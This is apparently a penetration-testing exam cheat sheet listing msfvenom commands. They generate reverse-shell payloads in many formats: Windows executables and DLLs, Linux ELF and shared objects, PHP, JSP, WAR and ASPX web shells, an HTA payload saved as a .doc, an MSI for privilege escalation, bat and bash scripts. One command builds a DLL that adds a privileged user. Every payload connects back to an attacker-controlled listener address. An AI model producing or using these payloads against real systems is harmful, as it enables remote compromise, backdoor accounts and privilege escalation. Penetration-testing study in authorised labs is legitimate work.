# Resource
https://gabb4r.gitbook.io/oscp-notes/shell/msfvenom

# For Windows
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 EXITFUNC=thread -f exe > binary.exe

# For Debian x84 (Not x64)
msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=192.168.45.178 LPORT=443 -o shell

# Keep in mind that you can encode the payloads

# For a DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=6969 -f dll > phoneinfo.dll

# For a DLL to add user
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll

# In the fixing exploits module for a thread
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

# Shell code, as for eternal blue
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=9090 EXITFUNC=thread -f raw > wicked.bin

# VBA Macros
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh > shell.doc

# Linux 64 bit PHP
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=443	 > shell.php

# Windows PHP
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f exe > shell.php

# Windows 64 bit Apache Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=80 -f raw > shell.jsp

# Windows 64 bit ASPX
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -o shell443.aspx

# Apache Tomcat War
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war

# Jsp Reverse
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.178 LPORT=80 -f raw > shell.jsp

# Javascript Shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le -o shellcode

# Windows MSI File (AlwaysInstallElevated )
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.187 LPORT=21 -f msi > priv.msi

# Windows Bat File
msfvenom -p cmd/windows/reverse_powershell lhost= lport= > evil.bat

# Shared Object - Linux (.so)
msfvenom -p linux/x86/shell_reverse_tcp -f elf-so LHOST=192.168.45.178 LPORT=6379 -o utils.so

# Bash Reverse Shell
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.221 LPORT=2222 -f raw > shell2222.sh